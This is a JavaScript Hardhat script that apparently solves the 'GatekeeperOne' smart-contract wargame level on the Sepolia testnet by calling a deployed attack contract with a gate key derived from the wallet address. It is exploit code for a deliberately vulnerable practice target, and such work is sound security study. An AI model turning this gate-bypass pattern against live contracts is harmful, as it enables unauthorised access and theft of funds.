const {ethers} = require('hardhat');

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const GatekeeperOne_Address = '0x75990A00E84d6D9e90a795fe61aaf3C238E28bb6';
GatekeeperOne_Json = require('../artifacts/contracts/GatekeeperOne.sol/GatekeeperOne.json');
const GatekeeperOne_Abi = GatekeeperOne_Json.abi;
const GatekeeperOne = new ethers.Contract(GatekeeperOne_Address, GatekeeperOne_Abi, wallet1);

const Attack_GatekeeperOne_Address = '0x6c7FDC2f7F6BE6603cB49ba211FA8cc68da32497';
Attack_GatekeeperOne_Json = require('../artifacts/contracts/GatekeeperOne.sol/Attack_GatekeeperOne.json');
const Attack_GatekeeperOneAbi = Attack_GatekeeperOne_Json.abi;
const Attack_GatekeeperOne = new ethers.Contract(Attack_GatekeeperOne_Address, Attack_GatekeeperOneAbi, wallet1);


//wallet1_address = 0x8235753B562109C0efD4C2dA4E4138aed10Fa397
//attack_contract_address = 0x6c7FDC2f7F6BE6603cB49ba211FA8cc68da32497
const main = async () => {
    let entrant = await GatekeeperOne.entrant();
    console.log("entrant: ", entrant);
    console.log("Attacking...")
    const lastCharacters = "0x" + wallet1.address.slice(-16);
    console.log("lastCharacters: ", lastCharacters);
    const attack = await Attack_GatekeeperOne.attack2(lastCharacters);
    await attack.wait(1);
    entrant = await GatekeeperOne.entrant();
    console.log("entrant: ", entrant);

}

